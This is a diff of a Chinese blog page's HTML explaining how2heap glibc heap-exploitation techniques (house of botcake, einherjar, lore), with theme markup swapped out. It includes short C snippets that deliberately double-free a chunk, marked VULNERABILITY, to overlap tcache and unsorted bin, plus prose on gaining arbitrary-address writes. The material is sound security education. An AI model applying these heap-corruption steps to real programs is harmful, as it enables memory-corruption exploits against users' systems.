 <p>之后free掉同样大小的prev chunk和a chunk，这时他们会在unsorted bin内合并为一个大chunk</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">puts<span class="hljs-comment">(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;)</span>;<br>free<span class="hljs-comment">(a)</span>;<br><br>puts<span class="hljs-comment">(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;)</span>;<br>free<span class="hljs-comment">(prev)</span>;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);</span><br><span class="line">free(prev);</span><br></pre></td></tr></table></figure>
 
 <p>先申请一个chunk，然后利用uaf，对 a chunk再次free，让其进入tcache。此时，a chunk同时在tcache和unsorted bin 中。</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">puts<span class="hljs-comment">(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;)</span>;<br>malloc<span class="hljs-comment">(0x100)</span>;<br><span class="hljs-comment">/*VULNERABILITY*/</span><br>free<span class="hljs-comment">(a)</span>;<span class="hljs-comment">// a is already freed</span><br><span class="hljs-comment">/*VULNERABILITY*/</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;);</span><br><span class="line">malloc(0x100);</span><br><span class="line">/*VULNERABILITY*/</span><br><span class="line">free(a);// a is already freed</span><br><span class="line">/*VULNERABILITY*/</span><br></pre></td></tr></table></figure>
 
 <p>此时如果我们申请一个大一点的chunk，比如0x120，那么就会把prev的指针返回回来，并且可以对a chunk进行溢出，进而更改a chunk的fd，bk等等。</p>
 <h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><p>house of einherjar是一种特殊的堆利用手段，在存在堆溢出可以更改下一个chunk的PREV_INUSE位时，可以利用free的堆块合并，使用这种方式实现任意地址的控制。</p>
@@ -317,432 +108,50 @@
 <h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
 <p>实际过程就是控制smallbin的最后一个chunk的bk指针，以及fakechunk的fd指针完成双链表的构建既可两次malloc控制任意地址</p>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>【how2heap】 botcake,einherjar,lore</div>
-      <div>http://loora1n.github.io/2022/10/20/how2heap① botcake,einherjar,lore/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Loora1N</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年10月20日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
       
     </div>
-    <div class="license-icon iconfont"></div>
+
   </div>
 
+  <div class="article-footer">
+    <div class="article-meta pull-left">
 
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/10/25/vscode%E4%BD%BF%E7%94%A8pwntools%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E5%87%BA%E9%94%99/" title="vscode使用pwntools代码高亮出错">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vscode使用pwntools代码高亮出错</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/" title="Kernel-pwnbase详解">
-                        <span class="hidden-mobile">Kernel-pwnbase详解</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-  <article id="comments">
     
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#comments', function() {
-      var light = 'github-light';
-      var dark = 'github-dark';
-      var schema = document.documentElement.getAttribute('data-user-color-scheme');
-      if (schema === 'dark') {
-        schema = dark;
-      } else {
-        schema = light;
-      }
-      window.UtterancesThemeLight = light;
-      window.UtterancesThemeDark = dark;
-      var s = document.createElement('script');
-      s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'loora1n/comment');
-      s.setAttribute('issue-term', 'pathname');
-      
-      s.setAttribute('label', 'utterances');
-      
-      s.setAttribute('theme', schema);
-      s.setAttribute('crossorigin', 'anonymous');
-      document.getElementById('comments').appendChild(s);
-    })
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
 
-
-  </article>
-
-
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
+    
 
     </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2023 Loora1N
+    
+  </p>
+</footer>
+    
+    
   </div>
 </div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/Loora1N" target="_blank" rel="nofollow noopener"><span>Loora1N</span></a> <i class="iconfont icon-love"></i> <a href="https://space.bilibili.com/33242548?spm_id_from=333.1007.0.0" target="_blank" rel="nofollow noopener"><span>鷺雨君</span></a>
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("06/03/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀running🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>   
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
 <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
